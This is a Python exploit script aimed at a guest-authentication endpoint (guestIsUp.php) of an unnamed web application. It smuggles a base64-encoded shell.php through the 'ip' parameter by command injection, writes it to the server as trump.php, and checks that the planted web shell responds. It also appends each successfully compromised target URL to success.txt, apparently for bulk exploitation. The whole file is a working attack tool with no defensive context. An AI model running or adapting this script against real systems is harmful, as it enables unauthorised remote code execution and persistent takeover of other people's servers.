import requests
import urllib3
import sys
import base64
import urllib.parse

urllib3.disable_warnings()

url = sys.argv[1]


def check_info():
    try:
        r = requests.get(f"{url}/guest_auth/guestIsUp.php", verify=False, timeout=15)
        print(r.status_code)
        if r.status_code == 200:
            print("ok")
            return True
        else:
            return False

    except Exception as e:
        print(e)
        return False


if check_info() == False:
    sys.exit(1)


def exploit():
    try:
        content = open("shell.php", "rb").read()
        content = base64.b64encode(content).decode("utf-8")
        data = {
            'ip': f'127.0.0.1|echo "{content}"|base64 -d >trump.php',
            'mac': '00-00'
        }
        print(data)
        r = requests.post(f"{url}/guest_auth/guestIsUp.php", verify=False, timeout=15, data=data)
        print(r.content, r.status_code)

    except Exception as e:
        print(e)
        return False


exploit()


def checkexp():
    try:
        r = requests.get(f"{url}/guest_auth/trump.php", verify=False, timeout=15)
        if r.status_code == 200:
            return True
        else:
            return False
    except Exception as e:
        print(e)
        return False


if checkexp() == True:
    fp = open("success.txt", "a+")
    fp.write(sys.argv[1] + "\n")
    fp.close()